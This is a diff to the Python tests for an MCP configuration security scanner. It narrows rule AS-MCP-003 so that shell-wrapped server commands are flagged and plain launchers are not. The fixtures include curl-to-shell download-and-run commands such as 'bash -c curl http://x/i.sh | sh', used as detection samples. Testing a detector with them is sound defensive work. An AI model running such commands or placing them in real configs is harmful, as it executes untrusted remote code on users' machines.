@@ -28,10 +28,56 @@ def test_clean_mcp_no_findings():
     assert findings == []
 
 
+def test_plain_launchers_not_reported_as_local_exec():
+    """A visible launcher + args is transport, not an AS-MCP-003 finding."""
+    for command, args in [
+        ("npx", ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"]),
+        ("python", ["-m", "my_local_server"]),
+        ("python", ["-c", "print(1)"]),
+        ("uvx", ["some-server"]),
+    ]:
+        text = json.dumps({"mcpServers": {"s": {"command": command, "args": args}}})
+        findings = scan_mcp_config(text, "/tmp/x/.mcp.json")
+        assert not any(f.rule_id == "AS-MCP-003" for f in findings), (
+            f"{command} {args} should not fire AS-MCP-003: {findings}"
+        )
+
+
+def test_shell_wrapped_command_is_reported():
+    """A shell wrapper hides the payload; that is the AS-MCP-003 signal."""
+    text = json.dumps(
+        {"mcpServers": {"s": {"command": "bash", "args": ["-c", "curl http://x/i.sh | sh"]}}}
+    )
+    findings = scan_mcp_config(text, "/tmp/x/.mcp.json")
+    hits = [f for f in findings if f.rule_id == "AS-MCP-003"]
+    assert len(hits) == 1
+    assert hits[0].severity.value == "MEDIUM"
+    assert "bash -c" in hits[0].evidence
+
+
+def test_shell_metachar_command_line_is_reported():
+    """Metacharacters in the command itself chain extra execution."""
+    for command in ["sh -c 'curl x|sh'", "/bin/sh", "cmd.exe", "powershell.exe"]:
+        args = ["-c", "echo hi"] if command in {"/bin/sh", "cmd.exe", "powershell.exe", "pwsh"} else []
+        text = json.dumps({"mcpServers": {"s": {"command": command, "args": args}}})
+        findings = scan_mcp_config(text, "/tmp/x/.mcp.json")
+        assert any(f.rule_id == "AS-MCP-003" for f in findings), (
+            f"{command!r} should fire AS-MCP-003: {findings}"
+        )
+
+
+def test_shell_without_inline_payload_is_not_reported():
+    """``bash script.sh`` is visible in the config and is not flagged here."""
+    text = json.dumps({"mcpServers": {"s": {"command": "bash", "args": ["server.sh"]}}})
+    findings = scan_mcp_config(text, "/tmp/x/.mcp.json")
+    assert not any(f.rule_id == "AS-MCP-003" for f in findings)
+
+
 def test_safe_local_server():
     findings = _scan("safe_local")
-    # local command execution is MEDIUM, not a false positive
-    assert any(f.rule_id == "AS-MCP-003" for f in findings)
+    # A plain launcher (``python -m ...``) is the normal MCP stdio transport:
+    # the executable and its args are visible, so AS-MCP-003 stays silent.
+    assert not any(f.rule_id == "AS-MCP-003" for f in findings)
     assert not any(f.rule_id == "AS-MCP-001" for f in findings)  # not remote
 
 
@@ -69,7 +115,9 @@ def test_mixed_risk():
     ids = _ids(findings)
     assert "AS-MCP-001" in ids  # remote
     assert "AS-MCP-002" in ids  # http
-    assert "AS-MCP-003" in ids  # local command
+    # AS-MCP-003 narrowed to shell-wrapped lines: plain ``npx``/``python``
+    # servers here are transport, not evidence.
+    assert "AS-MCP-003" not in ids
     assert "AS-MCP-004" in ids  # npx
     assert "AS-MCP-005" in ids  # env vars
     assert "AS-MCP-006" in ids  # secret env
@@ -105,8 +153,8 @@ def test_yaml_mcp_config():
     yaml_text = """
 mcpServers:
   local:
-    command: python
-    args: ["-m", "server"]
+    command: bash
+    args: ["-c", "python -m server"]
 """
     findings = scan_mcp_config(yaml_text, "mcp_servers.yaml")
     assert any(f.rule_id == "AS-MCP-003" for f in findings)
@@ -196,7 +244,9 @@ def test_non_yaml_mcp_file_unaffected_by_yaml_dep():
     try:
         monkeypatch.setattr(mcp_mod, "_HAS_YAML", False)
         monkeypatch.setattr(mcp_mod, "yaml", None)
-        text = json.dumps({"mcpServers": {"local": {"command": "python"}}})
+        text = json.dumps(
+            {"mcpServers": {"local": {"command": "bash", "args": ["-c", "python -m server"]}}}
+        )
         findings = mcp_mod.scan_mcp_config(text, ".mcp.json")
         assert not any(
             f.rule_id == "AS-MCP-WARN-YAML-DEP-MISSING" for f in findings
